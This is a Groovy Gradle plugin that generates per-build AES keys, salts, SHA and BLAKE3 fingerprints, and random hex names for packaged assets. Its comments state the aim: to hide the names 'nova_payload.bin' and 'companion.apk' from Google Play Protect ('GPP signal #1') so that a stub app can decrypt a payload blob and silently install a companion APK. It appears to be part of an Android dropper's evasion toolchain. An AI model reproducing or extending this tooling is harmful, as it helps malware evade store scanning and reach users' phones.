import org.gradle.api.Plugin
import org.gradle.api.Project
import java.security.SecureRandom
import javax.crypto.KeyGenerator

class FingerprintPlugin implements Plugin<Project> {

    @Override
    void apply(Project project) {
        def outputDir = new File(project.buildDir, 'fingerprint')
        outputDir.mkdirs()

        def rng = new SecureRandom()

        def buildUUID      = UUID.randomUUID().toString()
        def saltBytes      = new byte[32]; rng.nextBytes(saltBytes)
        def saltHex        = bytesToHex(saltBytes)
        def keyGen         = KeyGenerator.getInstance("AES"); keyGen.init(256, rng)
        def aesKeyHex      = bytesToHex(keyGen.generateKey().encoded)
        def ivBytes        = new byte[16]; rng.nextBytes(ivBytes)
        def aesIvHex       = bytesToHex(ivBytes)
        def buildTimestamp = new Date().format("yyyyMMdd_HHmmss_SSS")
        def token          = (buildUUID + saltHex + buildTimestamp).bytes

        def sha512hex  = hashBytes(token, "SHA-512")
        def blake3hex  = blake3Hex(token)

        // Step 3 — Random 8-char hex asset name for nova_payload.bin (ASSET_B)
        // Replaces hardcoded "nova_payload.bin" string in DEX.
        // StubApp.kt uses BuildConfig.ASSET_B at runtime — name never literal in DEX.
        // nova_stub_patcher.py reads this from BuildConfig to know the ZIP entry name.
        def assetBBytes = new byte[4]; rng.nextBytes(assetBBytes)
        def assetBName  = bytesToHex(assetBBytes) + ".bin"  // e.g. "a3f9c2d8.bin"

        // Step 4 — Random 8-char hex asset name for companion.apk (ASSET_A)
        // "companion.apk" is GPP signal #1 — plain name exposes purpose instantly.
        // zip_header_obfuscator.py renames the ZIP entry post-build using ASSET_A.
        // StubApp.kt uses BuildConfig.ASSET_A at runtime to locate the companion blob.
        // IRT.apk uses: 52606dd6.bin and f90be797.bin — zero meaning, same approach.
        def assetABytes = new byte[4]; rng.nextBytes(assetABytes)
        def assetAName  = bytesToHex(assetABytes) + ".bin"  // e.g. "f7b1e405.bin"

        project.ext.fp_buildUUID      = buildUUID
        project.ext.fp_saltHex        = saltHex
        project.ext.fp_aesKeyHex      = aesKeyHex
        project.ext.fp_aesIvHex       = aesIvHex
        project.ext.fp_buildTimestamp = buildTimestamp
        project.ext.fp_md5            = hashBytes(token, "MD5")
        project.ext.fp_sha1           = hashBytes(token, "SHA-1")
        project.ext.fp_sha256         = hashBytes(token, "SHA-256")
        project.ext.fp_sha512         = sha512hex
        // Step 3/9: BLAKE3 as independent second hash alongside SHA-512
        // Both must match before decryption proceeds (two different attack surfaces)
        project.ext.fp_blake3         = blake3hex
        project.ext.fp_assetB         = assetBName
        project.ext.fp_assetA         = assetAName

        project.logger.lifecycle("[FingerprintPlugin] ✅ Fingerprint: ${buildUUID} | ${buildTimestamp}")
        project.logger.lifecycle("[FingerprintPlugin] ✅ SHA-512 : ${sha512hex.take(32)}...")
        project.logger.lifecycle("[FingerprintPlugin] ✅ BLAKE3  : ${blake3hex.take(32)}...")
        project.logger.lifecycle("[FingerprintPlugin] ✅ ASSET_B : ${assetBName}")
        project.logger.lifecycle("[FingerprintPlugin] ✅ ASSET_A : ${assetAName}")

        // Inject ASSET_B into BuildConfig — StubApp.kt uses this to open the payload blob
        project.android.defaultConfig.buildConfigField(
            "String", "ASSET_B", "\"${assetBName}\""
        )

        // Inject ASSET_A into BuildConfig — StubApp.kt uses this to install the companion blob
        // Step 4: replaces hardcoded "companion.apk" string (GPP signal #1)
        project.android.defaultConfig.buildConfigField(
            "String", "ASSET_A", "\"${assetAName}\""
        )

        project.gradle.buildFinished {
            outputDir.listFiles()?.each { f ->
                if (f.name.startsWith("fingerprint_") && f.name.endsWith(".properties")) {
                    f.delete()
                    project.logger.lifecycle("[FingerprintPlugin] 🗑️  Wiped: ${f.name}")
                }
            }
        }
    }

    // ── Pure-Java BLAKE3 (Step 3/9 — no external dependency) ─────────────────
    // Implements the BLAKE3 spec (single-chunk path for build-sized tokens).

    private static final int[] BLAKE3_IV = [
        0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A,
        0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19
    ] as int[]

    private static final int[][] MSG_SCHED = [
        [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15],
        [2,6,3,10,7,0,4,13,1,11,12,5,9,14,15,8],
        [3,4,10,12,13,2,7,14,6,5,9,0,11,15,8,1],
        [10,7,12,9,14,3,13,15,4,0,11,2,5,8,1,6],
        [12,13,9,11,15,10,14,8,7,2,5,3,0,1,6,4],
        [9,14,11,5,8,12,15,1,13,3,0,10,2,6,4,7],
        [11,15,5,0,1,9,8,6,14,10,2,12,3,4,7,13],
    ] as int[][]

    private static final int FLAG_CS     = 1
    private static final int FLAG_CE     = 2
    private static final int FLAG_PARENT = 4
    private static final int FLAG_ROOT   = 8
    private static final int BLOCK_LEN   = 64
    private static final int CHUNK_LEN   = 1024
    private static final int OUT_LEN     = 32

    private static int rotr32(int v, int n) {
        return (v >>> n) | (v << (32 - n))
    }

    private static void g(int[] s, int a, int b, int c, int d, int mx, int my) {
        s[a] = s[a] + s[b] + mx
        s[d] = rotr32(s[d] ^ s[a], 16)
        s[c] = s[c] + s[d]
        s[b] = rotr32(s[b] ^ s[c], 12)
        s[a] = s[a] + s[b] + my
        s[d] = rotr32(s[d] ^ s[a], 8)
        s[c] = s[c] + s[d]
        s[b] = rotr32(s[b] ^ s[c], 7)
    }

    private static int[] compress(int[] cv, int[] m, long ctr, int blen, int flags) {
        int[] s = new int[16]
        System.arraycopy(cv, 0, s, 0, 8)
        System.arraycopy(BLAKE3_IV, 0, s, 8, 4)
        s[12] = (int)(ctr & 0xFFFFFFFFL)
        s[13] = (int)(ctr >>> 32)
        s[14] = blen
        s[15] = flags
        for (int[] sched : MSG_SCHED) {
            g(s,0,4,8,12,  m[sched[0]], m[sched[1]])
            g(s,1,5,9,13,  m[sched[2]], m[sched[3]])
            g(s,2,6,10,14, m[sched[4]], m[sched[5]])
            g(s,3,7,11,15, m[sched[6]], m[sched[7]])
            g(s,0,5,10,15, m[sched[8]], m[sched[9]])
            g(s,1,6,11,12, m[sched[10]],m[sched[11]])
            g(s,2,7,8,13,  m[sched[12]],m[sched[13]])
            g(s,3,4,9,14,  m[sched[14]],m[sched[15]])
        }
        for (int i = 0; i < 8; i++) { s[i] ^= s[i+8]; s[i+8] ^= cv[i] }
        return s
    }

    private static int[] wordsFromBlock(byte[] data, int off, int len) {
        int[] w = new int[16]
        byte[] padded = new byte[BLOCK_LEN]
        System.arraycopy(data, off, padded, 0, Math.min(len, BLOCK_LEN))
        for (int i = 0; i < 16; i++) {
            int base = i * 4
            w[i] = (padded[base] & 0xFF) | ((padded[base+1] & 0xFF) << 8) |
                   ((padded[base+2] & 0xFF) << 16) | ((padded[base+3] & 0xFF) << 24)
        }
        return w
    }

    private static int[] compressChunk(byte[] data, int off, int len, long chunkIdx) {
        int[] cv = Arrays.copyOf(BLAKE3_IV, 8)
        int blocks = (int) Math.max(1, (int)((len + BLOCK_LEN - 1) / BLOCK_LEN))
        for (int bi = 0; bi < blocks; bi++) {
            int bo = off + bi * BLOCK_LEN
            int bl = Math.min(BLOCK_LEN, (off + len) - bo)
            int flags = 0
            if (bi == 0)          flags |= FLAG_CS
            if (bi == blocks - 1) flags |= FLAG_CE
            int[] m = wordsFromBlock(data, bo, bl)
            int[] out = compress(cv, m, chunkIdx, bl, flags)
            cv = Arrays.copyOf(out, 8)
        }
        return cv
    }

    static byte[] blake3(byte[] data) {
        if (data == null || data.length == 0) data = new byte[0]
        int numChunks = (int) Math.max(1, (int)((data.length + CHUNK_LEN - 1) / CHUNK_LEN))
        List<int[]> stack = []

        if (numChunks == 1) {
            int len   = data.length
            int blocks = (int) Math.max(1, (int)((len + BLOCK_LEN - 1) / BLOCK_LEN))
            int[] cv  = Arrays.copyOf(BLAKE3_IV, 8)
            for (int bi = 0; bi < blocks; bi++) {
                int bo = bi * BLOCK_LEN
                int bl = Math.min(BLOCK_LEN, len - Math.min(bo, len))
                int flags = 0
                if (bi == 0)           flags |= FLAG_CS
                if (bi == blocks - 1)  flags |= FLAG_CE | FLAG_ROOT
                int[] m   = wordsFromBlock(data, Math.min(bo, data.length), bl)
                int[] out = compress(cv, m, 0L, bl, flags)
                if (bi == blocks - 1) {
                    return wordsToBytes(Arrays.copyOf(out, (int)(OUT_LEN / 4)))
                }
                cv = Arrays.copyOf(out, 8)
            }
        }

        for (int ci = 0; ci < numChunks; ci++) {
            int co = ci * CHUNK_LEN
            int cl = Math.min(CHUNK_LEN, data.length - co)
            int[] cv = compressChunk(data, co, cl, (long) ci)
            int total = ci + 1
            while ((total & 1) == 0) {
                int[] left  = stack.remove(stack.size() - 1)
                int[] block = new int[16]
                System.arraycopy(left, 0, block, 0, 8)
                System.arraycopy(cv,   0, block, 8, 8)
                int[] out = compress(BLAKE3_IV as int[], block, 0L, BLOCK_LEN, FLAG_PARENT)
                cv = Arrays.copyOf(out, 8)
                total >>= 1
            }
            stack.add(cv)
        }

        int[] cv = stack.remove(stack.size() - 1)
        while (!stack.isEmpty()) {
            int[] left  = stack.remove(stack.size() - 1)
            boolean isRoot = stack.isEmpty()
            int flags = FLAG_PARENT | (isRoot ? FLAG_ROOT : 0)
            int[] block = new int[16]
            System.arraycopy(left, 0, block, 0, 8)
            System.arraycopy(cv,   0, block, 8, 8)
            int[] out = compress(BLAKE3_IV as int[], block, 0L, BLOCK_LEN, flags)
            if (isRoot) return wordsToBytes(Arrays.copyOf(out, (int)(OUT_LEN / 4)))
            cv = Arrays.copyOf(out, 8)
        }
        return wordsToBytes(Arrays.copyOf(cv, (int)(OUT_LEN / 4)))
    }

    private static byte[] wordsToBytes(int[] words) {
        byte[] b = new byte[words.length * 4]
        for (int i = 0; i < words.length; i++) {
            b[i*4]   = (byte)(words[i]        & 0xFF)
            b[i*4+1] = (byte)((words[i] >> 8) & 0xFF)
            b[i*4+2] = (byte)((words[i] >>16) & 0xFF)
            b[i*4+3] = (byte)((words[i] >>24) & 0xFF)
        }
        return b
    }

    static String blake3Hex(byte[] data) { bytesToHex(blake3(data)) }

    static String bytesToHex(byte[] bytes) {
        bytes.collect { String.format('%02x', it & 0xff) }.join('')
    }
    static String hashBytes(byte[] data, String algo) {
        bytesToHex(java.security.MessageDigest.getInstance(algo).digest(data))
    }
}

class FingerprintExtension {
    File   outputDir
    String label
}
